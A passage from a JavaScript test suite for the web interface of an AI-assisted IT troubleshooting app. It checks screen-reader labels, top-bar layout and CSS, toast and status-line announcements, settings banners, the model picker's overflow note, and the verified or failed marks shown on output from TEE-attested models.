  assert.deepEqual(radios().map((r) => r.checked), [false, true, false]);
  assert.ok(app.document.activeElement === radios()[1], "the keyboard stays on the host just chosen");
  assert.equal(app.$(".modal table.hosts").querySelectorAll("tr.current").length, 1);
  assert.doesNotMatch(app.$(".modal .host-table").textContent, /null/);
});

test("a button that shows only a symbol has a name for a screen reader, and the boxes have labels", async () => {
  const app = await page("a", (s) => {
    s.hypotheses = [{ id: "h1", text: "The disk is full", status: "open", confidence: 0.6, evidence: "" }];
    s.sessions.push({ ...s.sessions[0], id: "local-2" });
  });
  app.run(`pendingImages.push("data:image/png;base64,iVBO"); renderAttachments()`);
  app.call("toast", "A toast.");
  app.call("openSettings");
  await app.clock.tick(50);
  const symbols = app.document.querySelectorAll("button").filter((b) => b.textContent.trim() && !/[\p{L}\p{N}]/u.test(b.textContent));
  assert.deepEqual(symbols.filter((b) => !b.getAttribute("aria-label")).map((b) => `${b.id || b.getAttribute("class")} ${b.textContent}`), []);
  assert.ok(symbols.length >= 12, `${symbols.length} such buttons on the page`);
  assert.equal(app.$("#chat-input").getAttribute("aria-label"), "Message to the AI");
  assert.equal(cmdBox(app, 2).getAttribute("aria-label"), "Command #2");
  assert.equal(row(app, 2).querySelector(".sess").getAttribute("aria-label"), "Session for #2");
  assert.equal(button(row(app, 2), "↑").getAttribute("aria-label"), "Move #2 up");
  assert.equal(app.$("#queue-toggle").getAttribute("aria-expanded"), "true");
});

// ------------------------------------------------------------------ the top bar

test("a long case name is cut in the bar and whole in its tooltip, and the stylesheet keeps the bar's controls on one line each", async () => {
  const long = "TKT-10422 Acme Dental: file server fs01 slow since the weekend's patch run, users on the second floor";
  const app = await page("a", (s) => { s.case.name = long; s.case.client = "Acme Dental"; });
  assert.equal(app.$("#case-btn").textContent, `${long} · Acme Dental`);
  assert.equal(app.$("#case-btn").title, `${long} · Acme Dental\nStart a new case, or open, edit or delete a previous one`);
  await app.event({ type: "state", state: state("none") });
  assert.equal(app.$("#case-btn").title, "Start a new case, or open, edit or delete a previous one");
  const css = fs.readFileSync(path.join(WEB, "style.css"), "utf8").replace(/\/\*[\s\S]*?\*\//g, "");
  const rule = (selector) => css.split("}").map((r) => r.split("{")).filter(([sel]) => sel.split(",").some((x) => x.trim() === selector))
    .map(([, body]) => body).join(";");
  assert.match(rule("#topbar"), /flex-wrap:\s*wrap/);
  assert.match(rule("#topbar > *"), /white-space:\s*nowrap/);
  assert.match(rule("#case-btn"), /max-width:[^;]+;\s*overflow:\s*hidden;\s*text-overflow:\s*ellipsis/);
  assert.match(rule("#model-name"), /text-overflow:\s*ellipsis/);
  // the workspace never gives way to the queue, and the chat log keeps room to read in
  assert.match(rule("body"), /grid-template-rows:\s*auto auto minmax\(180px, 1fr\) 5px var\(--queue-h\)/);
  assert.match(rule("#chat-log"), /min-height:\s*110px/);
  assert.match(rule("#chat-pane"), /overflow-y:\s*auto/);
  // toasts above the queue, not over its buttons; the "no images" label is not struck through
  assert.match(rule("#queue-pane ~ #toasts"), /bottom:\s*calc\(var\(--queue-h\) \+ 21px\)/);
  assert.doesNotMatch(rule("#vision-btn.none"), /line-through/);
});

test("in a small window the queue leaves the workspace its room, and a menu opens inside the window", async () => {
  const app = await page("a");
  const queueH = () => app.document.documentElement.style.getPropertyValue("--queue-h");
  app.call("applyLayout");
  assert.equal(queueH(), "240px");
  app.window.innerHeight = 600;                                   // the app window at its smallest
  app.call("applyLayout");
  assert.equal(queueH(), "200px");
  app.window.innerHeight = 420;
  app.call("applyLayout");
  assert.equal(queueH(), "90px");
  app.window.innerHeight = 1000;
  app.run("layout.queue_h = 500");
  app.call("applyLayout");
  assert.equal(queueH(), "500px");
  // the bar wrapped: Export sits at the left of its row, where a menu hung from its right edge would leave the window
  const menu = app.$("#export-menu");
  menu.getBoundingClientRect = () => ({ left: -150, right: 90, top: 80, bottom: 240 });
  app.$("#export-btn").click();
  assert.deepEqual([menu.classList.contains("hidden"), menu.style.left, menu.style.right], [false, "0", "auto"]);
  menu.getBoundingClientRect = () => ({ left: 300, right: 540, top: 80, bottom: 240 });
  app.$("#export-btn").click();
  app.$("#export-btn").click();
  assert.deepEqual([menu.style.left, menu.style.right], ["", ""]);
});

test("a toast can be dismissed and is announced; the status line announces what changed, not its clock", async () => {
  const app = await page("a");
  const D = app.run("Date");
  let now = 1.8e12;
  D.now = () => now;
  const pass = async (secs) => { for (let i = 0; i < secs; i++) { now += 1000; await app.clock.tick(1000); } };
  app.call("toast", "Saved.", "ok", 6000);
  app.call("toast", "It failed.", "error", 12000);
  const [ok, failed] = app.$("#toasts").querySelectorAll(".toast");
  assert.equal(app.$("#toasts").getAttribute("aria-live"), "polite");
  assert.deepEqual([ok.getAttribute("role"), failed.getAttribute("role")], [null, "alert"]);
  assert.deepEqual(app.toasts(), ["Saved.", "It failed."]);
  failed.querySelector("button.dismiss").click();
  assert.deepEqual(app.toasts(), ["Saved."]);
  await pass(6);
  assert.deepEqual(app.toasts(), []);
  // the status line
  const text = app.$("#chat-status-text"), ticking = app.$("#chat-status-clock");
  assert.deepEqual([text.getAttribute("aria-live"), ticking.getAttribute("aria-hidden"), app.$("#chat-status").getAttribute("aria-live")], ["polite", "true", null]);
  await app.event({ type: "turn_start", model: "m", tier: "standard" });
  assert.equal(text.textContent, "AI is responding: Waiting for the model…");
  await app.event({ type: "delta", kind: "text", text: "Looking" });
  await pass(1);
  const said = text.firstChild;
  assert.equal(text.textContent, "AI is responding: Writing…");
  await pass(2);
  assert.ok(text.firstChild === said, "the same words aren't written, and so not announced, again");
  assert.equal(ticking.textContent, "·  0:03");
  await pass(3);
  assert.equal(text.textContent, "AI is responding: Writing… still working");
  assert.equal(ticking.textContent, "no new text for 6s  ·  0:06");
  const still = text.firstChild;
  await pass(2);
  assert.ok(text.firstChild === still);
  assert.equal(ticking.textContent, "no new text for 8s  ·  0:08");
  await app.event({ type: "turn_end", chat: [{ kind: "assistant", text: "Looking good." }] });
  assert.match(text.textContent, /^✓ AI finished \(0:08\)\. Your turn/);
  assert.equal(ticking.textContent, "");
});

test("a settings notice and a keyring problem show in the banners", async () => {
  const app = await page("a", (s) => {
    s.ui_notice = "config.toml couldn't be read; it was set aside as config.toml.broken-20261104-080000.";
    s.keyring_error = "No keyring is running.";
  });
  assert.ok(app.$("#notice-banner").parentElement === app.$("#banners"), "the banners are in their own row");
  assert.equal(app.$("#notice-banner").classList.contains("hidden"), false);
  assert.match(app.$("#notice-banner").textContent, /set aside as config\.toml\.broken/);
  assert.match(app.$("#keyring-banner").textContent, /No keyring is running\. API keys and passwords cannot be stored\./);
  await app.event({ type: "state", state: state("a") });
  assert.equal(app.$("#notice-banner").classList.contains("hidden"), true);
  assert.equal(app.$("#keyring-banner").classList.contains("hidden"), true);
});

test("the model picker says how many models it isn't showing", async () => {
  const models = Array.from({ length: 450 }, (_, i) => ({ id: `vendor/model-${String(i).padStart(3, "0")}`, tier: "standard", allowed: true }));
  const app = await page("a", null, { "GET /api/models": () => ({ models }) });
  app.$("#model-btn").click();
  await app.clock.tick(100);
  const list = app.$(".model-list");
  assert.equal(list.querySelectorAll(".model-row").length, 400);
  assert.equal(list.lastElementChild.textContent, "50 more: type to narrow the list.");
  const filter = app.$(".overlay input[type=text]");
  await app.type(filter, "model-44");
  assert.equal(list.querySelectorAll(".model-row").length, 10);
  assert.equal(list.querySelectorAll(".model-row").length, list.children.length, "no note under ten models");
});

test("whatever else a TEE model wrote carries the reply's mark: a description, a second opinion, research, a write-up, a summary", async () => {
  const app = await page("a");
  const tee = { tee_attested: "Intel TDX quote verified", tee_signature: "failed" };
  const marks = (el) => el.querySelectorAll(".tee-badge").map((b) => [b.textContent, b.getAttribute("class")]);
  const failed = ["🛡 TEE · ✖ check failed", "tee-badge bad"];

  const user = app.call("renderEntry", { kind: "user", text: "look", images: ["img-1.png"],
    image_notes: { "img-1.png": { model: "TEE/kimi-k3", text: "A console menu.", ...tee, tee_signature: "verified" } } });
  assert.deepEqual(marks(user.querySelector("summary")), [["🛡 TEE · ✔ verified", "tee-badge ok"]]);

  const item = { num: 3, command: "uptime", review: { status: "done", level: "care", verdict: "proceed with care",
    summary: "shows the load", model: "TEE/glm-5.3", tier: "tee", text: "SUMMARY: shows the load", ...tee } };
  assert.deepEqual(marks(app.call("reviewLine", item)), [failed]);
  app.call("showReview", item);
  assert.deepEqual(marks(app.$(".modal")), [failed]);
  button(app.$(".modal"), "Close").click();
  await app.clock.tick(0);

  const card = app.call("researchCard", { id: "1", task: "research", status: "done", brief: "dhcp relay", model: "TEE/glm-5.3",
    searches: 1, pages: 1, cost: 0.01, steps: [], ...tee });
  assert.deepEqual(marks(card.querySelector(".phead")), [failed]);
  assert.deepEqual(marks(app.call("researchCard", { id: "2", task: "research", status: "done", brief: "b", model: "x/y",
    searches: 0, pages: 0, steps: [] })), []);                         // a model that isn't TEE: no mark

  app.routes["POST /api/export/summary"] = () => ({ text: "Ticket: VPN restored.", path: "/cases/a/ticket-summary.md", ...tee });
  await app.call("doExport", "summary");
  assert.deepEqual(marks(app.$(".modal")), [failed]);
  assert.equal(app.$(".modal textarea").value, "Ticket: VPN restored.");
  assert.doesNotMatch(app.$(".modal .content").textContent, /null/);
  button(app.$(".modal"), "Close").click();
  await app.clock.tick(0);

  app.routes["POST /api/context/compact"] = () => ({ summary: "Problem: VPN.", model: "TEE/glm-5.3", exchanges: 2, kept: 1,
    summarised_tokens: 900, summary_tokens: 100, after_tokens: 400, limit: null, truncated: false, ...tee });
  await app.call("openCompactPreview", 1);
  assert.deepEqual(marks(app.$(".modal")), [failed]);
  assert.match(app.$(".modal").textContent, /This summary isn't what the attested enclave signed/);
});
